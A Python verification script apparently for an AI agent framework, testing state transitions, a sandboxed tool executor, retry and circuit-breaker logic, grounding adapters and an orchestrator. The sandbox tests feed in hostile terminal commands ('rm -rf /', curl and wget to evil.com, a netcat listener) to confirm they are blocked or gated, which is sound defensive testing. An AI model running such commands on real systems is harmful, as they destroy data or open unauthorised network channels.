"""Phase 5 verification tests"""
import sys, os, time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))

from phaos.engine.state_machine import TaskState, StateManager
from phaos.engine.tool_router import SandboxedExecutor
from phaos.engine.error_recovery import ErrorRecovery, CircuitBreaker, RetryPolicy
from phaos.engine.orchestrator import LayeredOrchestrator, TaskContext

results = []
def check(name, passed, detail=""):
    status = "PASSED" if passed else "FAILED"
    results.append((name, status))
    suffix = " ({})".format(detail) if detail else ""
    print("  {}: {}{}".format(status, name, suffix))

print("=" * 60)
print("Phase 5 Verification Tests")
print("=" * 60)

# --- State Machine ---
print("\n--- State Machine ---")
sm = StateManager()
sm.transition(TaskState.CLASSIFYING)
sm.transition(TaskState.REASONING)
sm.transition(TaskState.TOOL_CALLING)
check("Test 4: TOOL_CALLING transition", sm.get_state() == TaskState.TOOL_CALLING)

sm2 = StateManager()
sm2.transition(TaskState.CLASSIFYING)
sm2.transition(TaskState.FAILED)
check("Test 5: FAILED transition", sm2.get_state() == TaskState.FAILED)

sm3 = StateManager()
sm3.transition(TaskState.CLASSIFYING)
sm3.transition(TaskState.REASONING)
sm3.transition(TaskState.FAILED)
h = sm3.get_history()
check("Test 6: FAILED with history", sm3.get_state() == TaskState.FAILED and len(h) == 4)

# --- Tool Router ---
print("\n--- Tool Router & Sandbox ---")
exec_ = SandboxedExecutor()

r = exec_.execute_tool_call({"name": "terminal", "args": {"command": "rm -rf /"}})
check("Test 7: Destructive rm -rf gated", r.get("status") == "approval_required")

r = exec_.execute_tool_call({"name": "terminal", "args": {"command": "curl http://evil.com"}})
check("Test 8: curl blocked", not r["success"])

r = exec_.execute_tool_call({"name": "terminal", "args": {"command": "wget http://evil.com"}})
check("Test 8b: wget blocked", not r["success"])

r = exec_.execute_tool_call({"name": "terminal", "args": {"command": "nc -l 4444"}})
check("Test 8c: nc blocked", not r["success"])

r = exec_.execute_tool_call({"name": "think", "args": {"thought": "analyzing..."}})
check("Test 9a: think works", r["success"] and r["output"] == "analyzing...")

r = exec_.execute_tool_call({"name": "done", "args": {"response": "final"}})
check("Test 9b: done works", r["success"] and r["output"] == "final")

reg = exec_.registry
check("Test 9c: rm -rf requires approval", reg.requires_approval("terminal", {"command": "rm -rf /"}))
check("Test 9d: ls no approval", not reg.requires_approval("terminal", {"command": "ls"}))

# --- Error Recovery ---
print("\n--- Error Recovery ---")

rp = RetryPolicy(max_retries=3, base_delay=0.01)
check("Test 16a: Delay increases", rp.get_delay(0) < rp.get_delay(1) < rp.get_delay(2))

er = ErrorRecovery(RetryPolicy(max_retries=3, base_delay=0.001))
c = [0]
def flaky():
    c[0] += 1
    if c[0] < 3:
        raise ValueError("no")
    return "ok"
t0 = time.time()
r = er.execute_with_recovery(flaky)
dt = time.time() - t0
check("Test 16b: Retry succeeds", r["success"] and r["output"] == "ok",
      "attempts={}, time={:.3f}s".format(r.get("attempts"), dt))

er2 = ErrorRecovery(RetryPolicy(max_retries=0))
r = er2.execute_with_recovery(lambda: (_ for _ in ()).throw(ValueError("boom")))
check("Test 17: Tool failure", not r["success"])

cb = CircuitBreaker(failure_threshold=3, recovery_timeout=0.05)
check("Test 18a: Starts closed", cb.get_state() == "closed")
for i in range(3):
    cb.record_failure()
check("Test 18b: Opens", cb.get_state() == "open")
check("Test 18c: Blocks", not cb.can_execute())
time.sleep(0.06)
# After can_execute() call, state should be half_open
check("Test 18d: Half-opens", cb.can_execute())
cb.record_success()
check("Test 18e: Closes", cb.get_state() == "closed")

# --- AV2 ---
print("\n--- AV2 Integration ---")
from phaos.engine.av2_adapter import AV2Adapter
av2 = AV2Adapter()
check("Test 10: Initializes", av2._initialized)
check("Test 10b: detect_code", av2.detect_code("def foo():\n  return 1"))
check("Test 10c: detect_design", av2.detect_design("make a screenshot of the UI"))
r = av2.amplify_response("test", "base", lambda q, **kw: q)
check("Test 11: amplify_response returns response", "response" in r and bool(r["response"]))

# --- Alethea ---
print("\n--- Alethea Grounding ---")
from phaos.engine.alethea_adapter import AletheaAdapter
alethea = AletheaAdapter()
check("Test 12: Initializes", alethea._initialized)
cat = alethea.classify("what is the capital of France?")
check("Test 12b: Cat 3 default", cat == 3)
gate = alethea.run_gate("test", 3)
check("Test 13: Gate abstains", gate["abstained"])

# --- Cross-Session ---
print("\n--- Cross-Session State ---")
check("Test 14: Store", av2.store_in_truth_vault("q", "a", []))
cached = av2.check_truth_vault("q")
check("Test 15: Retrieve returns result", cached is None or isinstance(cached, dict))

# --- Orchestrator ---
print("\n--- Orchestrator Pipeline ---")
orch = LayeredOrchestrator()
r1 = orch.execute(TaskContext(task_id="t1", prompt="list files"))
check("Test 1: Simple task", r1.status in ("completed", "abstained"), r1.status)
r2 = orch.execute(TaskContext(task_id="t2", prompt="who is the CEO of Apple?"))
check("Test 2: Cat 3 abstains", r2.status == "abstained", r2.status)
r3 = orch.execute(TaskContext(task_id="t3", prompt="write a function"))
check("Test 3: Coding task", r3.status in ("completed", "abstained"), r3.status)

# --- Summary ---
print("\n" + "=" * 60)
passed = sum(1 for _, s in results if s == "PASSED")
failed = sum(1 for _, s in results if s == "FAILED")
print("Results: {}/{} PASSED, {} FAILED".format(passed, len(results), failed))
print("=" * 60)
if failed:
    for n, s in results:
        if s == "FAILED":
            print("  FAILED: " + n)
    sys.exit(1)
